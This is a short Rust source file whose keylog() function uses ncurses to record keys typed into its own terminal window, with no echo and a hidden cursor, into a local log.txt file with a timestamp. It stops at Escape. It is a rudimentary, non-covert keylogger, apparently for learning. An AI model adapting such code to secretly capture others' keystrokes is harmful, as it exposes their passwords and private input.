use chrono::DateTime;
use ncurses::*;
use std::env;
use std::fs::OpenOptions;
use std::io::Write;
use std::thread::sleep;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

pub fn keylog() {
    // Get the current working directory
    let current_dir = env::current_dir().expect("Failed to get current directory");
    let log_file_path = current_dir.join("log.txt");

    println!("Current working directory: {}", current_dir.display());
    println!("Log file path: {}", log_file_path.display());

    // Open the log file in append mode
    let mut log_file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_file_path)
        .expect("Failed to open log file");

    // Write the start time to the log file
    let start_time = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("SystemTime before UNIX EPOCH!");
    writeln!(
        log_file,
        "\n#$Logger: Started logging @ {}",
        format_time(start_time.as_secs())
    )
    .expect("Failed to write to log file");

    // Initialize ncurses
    initscr();
    noecho();
    nodelay(stdscr(), true); // Non-blocking input
    curs_set(CURSOR_VISIBILITY::CURSOR_INVISIBLE);

    loop {
        sleep(Duration::from_millis(20)); // Sleep for 20 ms to reduce CPU usage
        let ch = getch();

        if ch != ERR {
            let key_str = match ch {
                32 => "[SPACE]".to_string(),       // Space key
                9 => "[TAB]".to_string(),          // Tab key
                10 => "[ENTER]".to_string(),       // Enter key
                27 => {                            // Escape key
                    writeln!(log_file, "[ESC]").expect("Failed to write to log file");
                    break;
                }
                127 => "[BACKSPACE]".to_string(),  // Backspace key
                _ => {
                    if let Some(name) = keyname(ch) {
                        name.to_string()
                    } else {
                        (ch as u8 as char).to_string()
                    }
                }
            };

            writeln!(log_file, "{}", key_str).expect("Failed to write to log file");
            log_file.flush().expect("Failed to flush log file");
        }
    }

    // Clean up ncurses
    endwin();
}

// Helper function to format time
fn format_time(secs: u64) -> String {
    let t = DateTime::from_timestamp(secs as i64, 0)
        .expect("Failed to parse timestamp");
    t.format("%Y-%m-%d %H:%M:%S").to_string()
}
